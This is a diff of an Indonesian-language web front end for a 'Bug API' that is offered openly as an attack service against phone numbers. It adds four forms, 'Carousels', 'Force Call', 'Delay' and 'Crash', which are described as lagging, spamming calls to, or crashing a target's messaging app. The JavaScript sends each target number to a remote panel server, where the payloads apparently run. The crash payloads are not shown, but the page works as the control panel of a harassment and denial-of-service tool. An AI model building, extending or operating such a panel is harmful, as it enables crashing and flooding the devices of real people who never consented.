@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>K_A_P Bot API - Pro</title>
+    <title>Kepforannas7hs Bug API</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         :root {
-            --bg-dark: #121212;
-            --card-bg: #1e1e1e;
-            --text-light: #e0e0e0;
-            --text-secondary: #bdbdbd;
-            --accent-purple: #bb86fc;
-            --accent-green: #03dac6;
-            --accent-red: #cf6679;
-            --border-color: #333333;
-            --gradient: linear-gradient(135deg, #bb86fc, #03dac6);
+            --bg-dark: #0a0a0a;
+            --card-bg: #1a1a1a;
+            --text-light: #ffffff;
+            --text-secondary: #aaaaaa;
+            --accent-purple: #8e2de2;
+            --accent-green: #43e97b;
+            --accent-red: #ff5252;
+            --border-color: #333;
+            --gradient: linear-gradient(90deg, #8e2de2, #4a00e0);
         }
-
+        
         * {
             box-sizing: border-box;
             margin: 0;
@@ -48,11 +48,11 @@
             background: radial-gradient(circle, var(--accent-purple) 0%, transparent 20%),
                         radial-gradient(circle, var(--accent-green) 0%, transparent 20%);
             background-repeat: no-repeat;
-            background-size: 400px 400px, 400px 400px;
+            background-size: 500px 500px, 500px 500px;
             background-position: top -100px left -100px, bottom -100px right -100px;
-            opacity: 0.05;
+            opacity: 0.1;
             z-index: -1;
-            animation: moveGradient 15s infinite alternate;
+            animation: moveGradient 20s infinite alternate;
         }
 
         @keyframes moveGradient {
@@ -62,73 +62,99 @@
 
         .container {
             width: 100%;
-            max-width: 1000px;
+            max-width: 1200px;
             display: flex;
             flex-direction: column;
-            gap: 25px;
+            gap: 30px;
             z-index: 1;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .header h1 {
-            font-size: 3rem;
+            font-size: clamp(2rem, 5vw, 4rem);
             font-weight: 700;
             background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 15px rgba(142, 45, 226, 0.5);
+            animation: textGlow 2s infinite alternate;
+        }
+        
+        @keyframes textGlow {
+            from { text-shadow: 0 0 10px rgba(142, 45, 226, 0.5); }
+            to { text-shadow: 0 0 20px rgba(142, 45, 226, 0.8), 0 0 30px rgba(74, 0, 224, 0.6); }
         }
 
         .header p {
             font-family: 'JetBrains Mono', monospace;
             color: var(--text-secondary);
-            font-size: 1rem;
-            margin-top: 5px;
+            font-size: clamp(0.8rem, 2vw, 1.2rem);
+            margin-top: 10px;
         }
 
         .main-content {
             display: grid;
             grid-template-columns: 1fr;
-            gap: 25px;
+            gap: 30px;
         }
 
         @media (min-width: 768px) {
             .main-content {
-                grid-template-columns: 1fr 1.5fr;
+                grid-template-columns: 1fr 2fr;
             }
         }
 
         .card {
             background-color: var(--card-bg);
-            border-radius: 20px;
-            padding: 30px;
+            border-radius: 25px;
+            padding: 40px;
             border: 1px solid var(--border-color);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
             transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            animation: slideIn 1s ease-out;
         }
-
+        
+        @keyframes slideIn {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
         .card:hover {
-            transform: translateY(-8px) scale(1.02);
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
         }
 
         .card h2 {
-            font-size: 1.7rem;
-            margin-bottom: 20px;
+            font-size: clamp(1.5rem, 3vw, 2rem);
+            margin-bottom: 25px;
             border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
+            padding-bottom: 20px;
             background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card h2 i {
+            font-size: clamp(1.2rem, 2.5vw, 1.8rem);
         }
 
         .info-section, .form-section {
             display: flex;
             flex-direction: column;
-            gap: 20px;
+            gap: 25px;
         }
 
         .info-item {
@@ -136,20 +162,20 @@
             align-items: center;
             gap: 15px;
             font-family: 'JetBrains Mono', monospace;
-            font-size: 0.95rem;
+            font-size: clamp(0.9rem, 2vw, 1rem);
             color: var(--text-secondary);
         }
 
         .info-item i {
-            font-size: 1.2rem;
+            font-size: 1.4rem;
             color: var(--accent-purple);
         }
         
         .status-dot {
-            width: 14px;
-            height: 14px;
+            width: 16px;
+            height: 16px;
             border-radius: 50%;
-            animation: pulse 2s infinite ease-in-out;
+            animation: pulse 2s infinite cubic-bezier(0.4, 0, 0.6, 1);
         }
 
         .status-dot.online {
@@ -170,15 +196,15 @@
 
         .form-group label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             color: var(--text-light);
             font-weight: 600;
         }
 
         .form-group input {
             width: 100%;
-            padding: 15px;
-            border-radius: 10px;
+            padding: 18px;
+            border-radius: 12px;
             border: 1px solid var(--border-color);
             background-color: #2a2a2a;
             color: var(--text-light);
@@ -189,21 +215,21 @@
         .form-group input:focus {
             outline: none;
             border-color: var(--accent-purple);
-            box-shadow: 0 0 0 4px rgba(187, 134, 252, 0.3);
+            box-shadow: 0 0 0 4px rgba(142, 45, 226, 0.3);
         }
 
         .btn-send {
             width: 100%;
-            padding: 15px 25px;
+            padding: 18px 25px;
             background: var(--gradient);
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             color: var(--text-light);
             font-weight: 700;
             font-size: 1rem;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
             position: relative;
             overflow: hidden;
         }
@@ -245,13 +271,13 @@
         .toast {
             background-color: #333;
             color: white;
-            padding: 18px;
-            border-radius: 12px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
             opacity: 0;
             transform: translateX(100px);
             transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            min-width: 280px;
+            min-width: 300px;
             display: flex;
             align-items: center;
             gap: 15px;
@@ -260,7 +286,7 @@
         }
 
         .toast i {
-            font-size: 1.4rem;
+            font-size: 1.6rem;
         }
 
         .toast.show {
@@ -268,33 +294,34 @@
             transform: translateX(0);
         }
 
-        .toast.success { background-color: var(--accent-green); }
-        .toast.error { background-color: var(--accent-red); }
-        .toast.info { background-color: var(--accent-purple); }
+        .toast.success { background: var(--accent-green); }
+        .toast.error { background: var(--accent-red); }
+        .toast.info { background: var(--accent-purple); }
 
         .api-endpoints-section {
-            margin-top: 25px;
-        }
-
-        .api-endpoints-section h3 {
-            font-size: 1.4rem;
-            color: var(--accent-purple);
-            margin-bottom: 15px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
         }
 
         .endpoint-card {
             background-color: #2a2a2a;
-            padding: 20px;
-            border-radius: 15px;
+            padding: 30px;
+            border-radius: 20px;
             border: 1px solid #444;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 20px;
+            transition: transform 0.3s ease;
         }
 
-        .endpoint-card h4 {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.1rem;
+        .endpoint-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .endpoint-card h3 {
+            font-size: clamp(1.2rem, 2vw, 1.5rem);
             color: var(--accent-green);
         }
 
@@ -307,7 +334,7 @@
 <body>
     <div class="container">
         <header class="header">
-            <h1>K_A_P Bot API</h1>
+            <h1>Kepforannas7hs Bug API</h1>
             <p>Platform REST API Profesional & Inovatif</p>
         </header>
 
@@ -322,27 +349,78 @@
                     </div>
                     <div class="info-item">
                         <i class="fas fa-clock"></i>
-                        <span id="currentTime">Loading...</span>
+                        <span id="currentTime">Memuat...</span>
                     </div>
                     <div class="info-item">
                         <i class="fas fa-map-marker-alt"></i>
-                        <span id="ipLocation">Loading...</span>
+                        <span id="ipLocation">Memuat...</span>
                     </div>
                 </div>
             </div>
 
-            <div class="card force-call-card">
-                <h2><i class="fas fa-headset"></i> Force Call Endpoint</h2>
-                <p>Kirim panggilan bug ke nomor target. Masukkan nomor telepon di bawah ini untuk memulai proses.</p>
-                <form id="bugForm" class="form-section">
-                    <div class="form-group">
-                        <label for="targetNumber">Nomor Telepon:</label>
-                        <input type="text" id="targetNumber" name="targetNumber" placeholder="Contoh: 6281234567890" required>
+            <div class="card">
+                <h2><i class="fas fa-bug"></i> Bug Endpoints</h2>
+                <div class="api-endpoints-section">
+                    <!-- Bug 1: Carousels -->
+                    <div class="endpoint-card">
+                        <h3>Carousels</h3>
+                        <p>Mengirim pesan interaktif dengan banyak item yang membuat perangkat target lambat.</p>
+                        <form class="bugForm" data-endpoint="carousels">
+                            <div class="form-group">
+                                <label for="targetNumber-1">Nomor Telepon:</label>
+                                <input type="text" id="targetNumber-1" name="targetNumber" placeholder="Contoh: 6281234567890" required>
+                            </div>
+                            <button type="submit" class="btn-send">
+                                <i class="fas fa-paper-plane"></i> Kirim
+                            </button>
+                        </form>
                     </div>
-                    <button type="submit" id="sendBtn" class="btn-send">
-                        <i class="fas fa-paper-plane"></i> Send
-                    </button>
-                </form>
+
+                    <!-- Bug 2: Force Call -->
+                    <div class="endpoint-card">
+                        <h3>Force Call</h3>
+                        <p>Mengirim panggilan kosong secara terus-menerus ke nomor target.</p>
+                        <form class="bugForm" data-endpoint="forcecall">
+                            <div class="form-group">
+                                <label for="targetNumber-2">Nomor Telepon:</label>
+                                <input type="text" id="targetNumber-2" name="targetNumber" placeholder="Contoh: 6281234567890" required>
+                            </div>
+                            <button type="submit" class="btn-send">
+                                <i class="fas fa-paper-plane"></i> Kirim
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Bug 3: FO1 -->
+                    <div class="endpoint-card">
+                        <h3>Delay</h3>
+                        <p>Mengirim pesan foto 'sekali lihat' yang berat dan membuat perangkat target lag.</p>
+                        <form class="bugForm" data-endpoint="fo1">
+                            <div class="form-group">
+                                <label for="targetNumber-3">Nomor Telepon:</label>
+                                <input type="text" id="targetNumber-3" name="targetNumber" placeholder="Contoh: 6281234567890" required>
+                            </div>
+                            <button type="submit" class="btn-send">
+                                <i class="fas fa-paper-plane"></i> Kirim
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Bug 4: Crash -->
+                    <div class="endpoint-card">
+                        <h3>Crash</h3>
+                        <p>Mengirim pesan yang dirancang khusus untuk membuat aplikasi target macet.</p>
+                        <form class="bugForm" data-endpoint="crash">
+                            <div class="form-group">
+                                <label for="targetNumber-4">Nomor Telepon:</label>
+                                <input type="text" id="targetNumber-4" name="targetNumber" placeholder="Contoh: 6281234567890" required>
+                            </div>
+                            <button type="submit" class="btn-send">
+                                <i class="fas fa-paper-plane"></i> Kirim
+                            </button>
+                        </form>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -350,17 +428,15 @@
     <div class="toast-container" id="toastContainer"></div>
 
     <script>
-        const bugForm = document.getElementById('bugForm');
-        const targetNumberInput = document.getElementById('targetNumber');
-        const sendBtn = document.getElementById('sendBtn');
+        // Ganti URL ini dengan URL domain server Anda yang berjalan di panel
+        const API_URL = 'https://ptero.v1.lynz.biz.id/server/7346d430/files#/session';
+
+        const bugForms = document.querySelectorAll('.bugForm');
         const botStatusDot = document.getElementById('botStatusDot');
         const botStatusText = document.getElementById('botStatusText');
         const currentTimeText = document.getElementById('currentTime');
         const ipLocationText = document.getElementById('ipLocation');
         const toastContainer = document.getElementById('toastContainer');
-
-        // Pastikan Anda mengubah URL ini ke alamat server Anda!
-        const API_URL = 'https://ptero.v1.lynz.biz.id/server/7346d430/files#/session:5036';
 
         function showToast(message, type = 'info') {
             const toast = document.createElement('div');
@@ -381,8 +457,7 @@
 
         async function updateSystemInfo() {
             try {
-                // Update bot status
-                const statusResponse = await fetch(`${API_URL}/api/status`);
+                const statusResponse = await fetch(`${API_URL}/status`);
                 const statusData = await statusResponse.json();
                 if (statusData.status === 'Online') {
                     botStatusDot.classList.remove('offline');
@@ -400,14 +475,12 @@
                 botStatusText.textContent = 'Failed to get status';
             }
 
-            // Update current time
             currentTimeText.textContent = new Date().toLocaleString('id-ID', { 
                 timeZone: 'Asia/Jakarta',
                 weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
                 hour: '2-digit', minute: '2-digit', second: '2-digit'
             });
 
-            // Update IP location
             try {
                 const ipResponse = await fetch('http://ip-api.com/json/');
                 const ipData = await ipResponse.json();
@@ -422,33 +495,41 @@
             }
         }
 
-        bugForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const targetNumber = targetNumberInput.value.trim();
-            if (!targetNumber) {
-                showToast('Nomor target tidak boleh kosong.', 'error');
-                return;
-            }
+        bugForms.forEach(form => {
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const endpoint = form.dataset.endpoint;
+                const targetNumberInput = form.querySelector('[name="targetNumber"]');
+                const targetNumber = targetNumberInput.value.trim();
 
-            sendBtn.disabled = true;
-            sendBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
-            showToast('Mengirim permintaan ke server...', 'info');
-
-            try {
-                const response = await fetch(`${API_URL}/api/bug/forcecall?target=${encodeURIComponent(targetNumber)}`);
-                const data = await response.json();
-
-                if (response.ok && data.status) {
-                    showToast('Force Call berhasil dikirim!', 'success');
-                } else {
-                    showToast(`Gagal: ${data.error || 'Terjadi kesalahan.'}`, 'error');
+                if (!targetNumber) {
+                    showToast('Nomor target tidak boleh kosong.', 'error');
+                    return;
                 }
-            } catch (error) {
-                showToast(`Terjadi kesalahan koneksi: ${error.message}`, 'error');
-            } finally {
-                sendBtn.disabled = false;
-                sendBtn.innerHTML = `<i class="fas fa-paper-plane"></i> Send`;
-            }
+
+                const sendBtn = form.querySelector('.btn-send');
+                sendBtn.disabled = true;
+                sendBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
+                showToast(`Mengirim permintaan ${endpoint}...`, 'info');
+
+                const url = `${API_URL}/bug/${endpoint}?target=${encodeURIComponent(targetNumber)}`;
+
+                try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+
+                    if (response.ok && data.status) {
+                        showToast(`${endpoint.toUpperCase()} berhasil dikirim!`, 'success');
+                    } else {
+                        showToast(`Gagal: ${data.error || 'Terjadi kesalahan.'}`, 'error');
+                    }
+                } catch (error) {
+                    showToast(`Terjadi kesalahan koneksi: ${error.message}`, 'error');
+                } finally {
+                    sendBtn.disabled = false;
+                    sendBtn.innerHTML = `<i class="fas fa-paper-plane"></i> Kirim`;
+                }
+            });
         });
 
         updateSystemInfo();
@@ -456,3 +537,4 @@
     </script>
 </body>
 </html>
+
